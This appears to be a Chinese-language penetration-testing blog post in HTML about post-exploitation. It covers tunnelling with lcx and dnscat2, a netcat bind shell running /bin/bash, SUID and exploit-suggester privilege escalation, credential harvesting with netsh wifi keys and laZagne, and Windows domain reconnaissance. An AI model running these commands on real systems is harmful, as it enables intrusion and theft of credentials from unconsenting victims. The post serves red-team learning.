@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>红蓝之隧道搭建与主机信息搜集 | Hexo</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="白帽子，咸鱼">
+  
+
+  <meta name="description" content="获取shell一般来说我们获取shell的途径就是 1、注入 2、文件上传 3、代码执行，反序列化、表达式注入其实都可以归类为代码执行 4、端口漏洞 1、2、4是每个系统各有不同，3的话更多的是已知的组件的漏洞，除非有源代码，不然是挖不到的。 反弹shell、搭建跳板拥有命令执行的权限后我们能写可以写入webshell，又或者反弹shell控制机器，建立一个方便操作的环境。 可以用于搭建隧道的是网">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红蓝之隧道搭建与主机信息搜集">
+<meta property="og:url" content="http://yoursite.com/2020/07/09/红蓝之隧道搭建与主机信息搜集/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="获取shell一般来说我们获取shell的途径就是 1、注入 2、文件上传 3、代码执行，反序列化、表达式注入其实都可以归类为代码执行 4、端口漏洞 1、2、4是每个系统各有不同，3的话更多的是已知的组件的漏洞，除非有源代码，不然是挖不到的。 反弹shell、搭建跳板拥有命令执行的权限后我们能写可以写入webshell，又或者反弹shell控制机器，建立一个方便操作的环境。 可以用于搭建隧道的是网">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/2020/07/09/红蓝之隧道搭建与主机信息搜集/1594877907617.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/09/红蓝之隧道搭建与主机信息搜集/1594878033575.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/09/红蓝之隧道搭建与主机信息搜集/1594880644853.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/09/红蓝之隧道搭建与主机信息搜集/1594697737662.png">
+<meta property="og:updated_time" content="2020-08-08T05:33:41.743Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="红蓝之隧道搭建与主机信息搜集">
+<meta name="twitter:description" content="获取shell一般来说我们获取shell的途径就是 1、注入 2、文件上传 3、代码执行，反序列化、表达式注入其实都可以归类为代码执行 4、端口漏洞 1、2、4是每个系统各有不同，3的话更多的是已知的组件的漏洞，除非有源代码，不然是挖不到的。 反弹shell、搭建跳板拥有命令执行的权限后我们能写可以写入webshell，又或者反弹shell控制机器，建立一个方便操作的环境。 可以用于搭建隧道的是网">
+<meta name="twitter:image" content="http://yoursite.com/2020/07/09/红蓝之隧道搭建与主机信息搜集/1594877907617.png">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-38189205-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+
+</head>
+</html>
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tags/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">Posts List</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#获取shell"><span class="toc-text">获取shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#反弹shell、搭建跳板"><span class="toc-text">反弹shell、搭建跳板</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹shell"><span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NPS"><span class="toc-text">NPS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Http隧道"><span class="toc-text">Http隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS隧道"><span class="toc-text">DNS隧道</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#提权"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux提权"><span class="toc-text">linux提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞提权"><span class="toc-text">漏洞提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#suid提权"><span class="toc-text">suid提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows提权"><span class="toc-text">Windows提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞提权-1"><span class="toc-text">漏洞提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三方组件提权"><span class="toc-text">第三方组件提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#内网信息收集"><span class="toc-text">内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#主机重要信息搜集"><span class="toc-text">主机重要信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#密码搜集"><span class="toc-text">密码搜集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#域-工作组信息收集"><span class="toc-text">域/工作组信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#我是谁，我在哪"><span class="toc-text">我是谁，我在哪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#我要到哪去"><span class="toc-text">我要到哪去</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-红蓝之隧道搭建与主机信息搜集" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">红蓝之隧道搭建与主机信息搜集</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2020.07.09</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>John Doe</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/渗透/">渗透</a>
+  </span>
+
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h1 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h1><p>一般来说我们获取shell的途径就是</p>
+<p>1、注入</p>
+<p>2、文件上传</p>
+<p>3、代码执行，反序列化、表达式注入其实都可以归类为代码执行</p>
+<p>4、端口漏洞</p>
+<p>1、2、4是每个系统各有不同，3的话更多的是已知的组件的漏洞，除非有源代码，不然是挖不到的。</p>
+<h1 id="反弹shell、搭建跳板"><a href="#反弹shell、搭建跳板" class="headerlink" title="反弹shell、搭建跳板"></a>反弹shell、搭建跳板</h1><p>拥有命令执行的权限后我们能写可以写入webshell，又或者反弹shell控制机器，建立一个方便操作的环境。</p>
+<p>可以用于搭建隧道的是网络层，传输层，应用层。</p>
+<p>网络层出网协议的话主要使用icmp协议</p>
+<p>传输层协议TCP和UDP协议</p>
+<p>应用层协议HTTPS，HTTP，DNS等一系列协议，这里的协议能够使用建立在传输层协议能连通的情况下。</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>正向shell没啥说的，讲一下反弹，反弹主要是转发绕过端口限制和入站限制。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave 公网主机ip 4444 127.0.0.1 3389 3389端口流量转发到具有公网ip主机的4444端口。</span><br><span class="line">lcx.exe -listen 4444 5555 将4444端口流量转发到5555</span><br><span class="line">访问5555就能访问内网3389</span><br></pre></td></tr></table></figure>
+
+<h2 id="NPS"><a href="#NPS" class="headerlink" title="NPS"></a>NPS</h2><p>可以参考<a href="https://ehang-io.github.io/nps/#/?id=nps" target="_blank" rel="noopener">官方教程</a></p>
+<h2 id="Http隧道"><a href="#Http隧道" class="headerlink" title="Http隧道"></a>Http隧道</h2><p>冰蝎、reGeorg都具有这样的功能使用很简单，可以<a href="https://github.com/L-codes/Neo-reGeorg" target="_blank" rel="noopener">参考</a></p>
+<h2 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h2><p><a href="https://bl4ck.in/penetration/2016/06/03/%E9%80%9A%E8%BF%87DNS%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99.html" target="_blank" rel="noopener">安装</a>这里不细说了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">服务端:ruby dnscat2.rb，我这里没有域名就没设置</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/09/红蓝之隧道搭建与主机信息搜集/1594877907617.png" alt="1594877907617"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">客户端./dnscat --dns server=x.x.x.x,port=53 --secret=密钥，使用服务端返回的密钥</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/09/红蓝之隧道搭建与主机信息搜集/1594878033575.png" alt="1594878033575"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">客户端:nc -lvvp 4444 -t -e /bin/bash</span><br><span class="line">服务器:listen 8000 192.168.46.146:4444</span><br><span class="line">攻击机:nc64.exe 服务端ip 8000</span><br><span class="line">成功运行命令截图</span><br><span class="line">这是反向shell，隧道的搭建也是一样步骤，就是客户端的命令变成了隧道的监听命令，这个不是很稳定，这是一种弊病。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/09/红蓝之隧道搭建与主机信息搜集/1594880644853.png" alt="1594880644853"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>建议不要用系统漏洞提，利用漏洞提权容易打崩系统，被客户叼，可以在机子上键盘记录啥的获取密码来登录高权限账号。</p>
+<h2 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">suid提权</span><br><span class="line">漏洞提权</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞提权"><a href="#漏洞提权" class="headerlink" title="漏洞提权"></a>漏洞提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux-exploit-suggester.sh --uname &quot;uname信息&quot;获取对应版本漏洞信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p>suid意味着其他用户可以用文件所有着权限运行文件，而部分文件可以用来执行命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>通过这个命令查找suid的文件,已知的可用来提权的linux可行性的文件：Nmap、Vim、find、Bash、More、Less、Nano、cp，以find为例。</p>
+<p>以find为例find test -exec whoami ; 其他的可以从参考<a href="https://blog.csdn.net/fly_hps/article/details/80428173" target="_blank" rel="noopener">suid提权</a></p>
+<p><img src="/2020/07/09/红蓝之隧道搭建与主机信息搜集/1594697737662.png" alt="1594697737662"></p>
+<h2 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏洞提权</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞提权-1"><a href="#漏洞提权-1" class="headerlink" title="漏洞提权"></a>漏洞提权</h3><p>windows-exploit-suggester.py</p>
+<p><a href="http://blog.neargle.com/win-powerup-exp-index/#" target="_blank" rel="noopener">http://blog.neargle.com/win-powerup-exp-index/#</a></p>
+<p>这两个一个是在线一个是离线根据systeminfo信息判断提权脚本信息的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python windows-exploit-suggester.py --update</span><br><span class="line">python windows-exploit-suggester.py --database 2020-07-22-mssb.xls --systeminfo sys.txt</span><br></pre></td></tr></table></figure>
+
+<p>找到可以利用的后可以去网上寻找提权脚本。</p>
+<h2 id="第三方组件提权"><a href="#第三方组件提权" class="headerlink" title="第三方组件提权"></a>第三方组件提权</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version查看软件版本信息</span><br><span class="line">mysql:借助mysql的高权限来提高web业务的低权限</span><br><span class="line">udf提权</span><br><span class="line">mof提权</span><br></pre></td></tr></table></figure>
+
+<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p>我们获得一个主机权限后同样需要信息收集，无域环境的渗透好说，这里主要是域渗透环境，我是谁？我在哪？我要到哪去？哲学三问，也是我们需要在内网中需要知道的。这里需要做什么我才初学内网也不清楚，后面边学边改。</p>
+<h2 id="主机重要信息搜集"><a href="#主机重要信息搜集" class="headerlink" title="主机重要信息搜集"></a>主机重要信息搜集</h2><h3 id="密码搜集"><a href="#密码搜集" class="headerlink" title="密码搜集"></a>密码搜集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netsh wlan show profiles # 查看连接过的wifi名称</span><br><span class="line">netsh wlan show profile name=&quot;wifi名称&quot; key=clear # 查看wifi的密码</span><br><span class="line">dir /a %userprofile%\AppData\Local\Microsoft\Credentials* # 查看RDP连接凭证</span><br><span class="line">dir /a /s /b &quot;网站目录\*config*&quot; &gt; 1.txt # 数据库配置文件</span><br><span class="line">laZagne.exe all -oN # 本地wifi/浏览器等密码</span><br><span class="line">dir %APPDATA%\Microsoft\Windows\Recent # 查看最近打开的文档</span><br></pre></td></tr></table></figure>
+
+<h2 id="域-工作组信息收集"><a href="#域-工作组信息收集" class="headerlink" title="域/工作组信息收集"></a>域/工作组信息收集</h2><h3 id="我是谁，我在哪"><a href="#我是谁，我在哪" class="headerlink" title="我是谁，我在哪"></a>我是谁，我在哪</h3><p>这一步的目的是了解被控制机器的位置与所在网络情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">whoami /all 查看自己的权限等</span><br><span class="line">ipconfig /all查看详细的网络信息，通过获得的网络信息，查看自己在哪一段。</span><br><span class="line">netstat -ano 查看端口开放情况</span><br><span class="line">net config workstation 查看当前所在域和登录用户信息</span><br><span class="line">net time /domain 可以判断是否存在域，</span><br></pre></td></tr></table></figure>
+
+<h3 id="我要到哪去"><a href="#我要到哪去" class="headerlink" title="我要到哪去"></a>我要到哪去</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">c段探测nmap和msscan</span><br><span class="line"></span><br><span class="line">域信息了解</span><br><span class="line">net view 当前域或工作组中计算机的列表 /domain查看有哪些域</span><br><span class="line">net view /domain:域名 可以获取到域内所有主机</span><br><span class="line">net group /domain      #查询域里面的组</span><br><span class="line">net group &quot;domain computers&quot; /domain  #查看加入到域内的所有计算机名</span><br><span class="line">net user /domain       #查看域用户</span><br><span class="line">dsquery user 域用户信息</span><br><span class="line"></span><br><span class="line">定位域控</span><br><span class="line">nltest /dclist:xxx     #查看域控制器</span><br><span class="line">net group &quot;domain controllers&quot; /domain   #查看域控制器</span><br><span class="line"></span><br><span class="line">定位域管理员账号</span><br><span class="line">net group &quot;domain admins&quot; /domain     #查看域管理员</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7701" target="_blank" rel="noopener">内网渗透之内网穿透</a></p>
+<p><a href="https://www.cnblogs.com/bmjoker/p/10336247.html" target="_blank" rel="noopener">我所了解的内网渗透</a></p>
+
+    
+  </div>
+
+</article>
+
+
+   
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2020/04/05/sql注入/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2020/08/09/红蓝之横向移动/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">Close</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tags/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
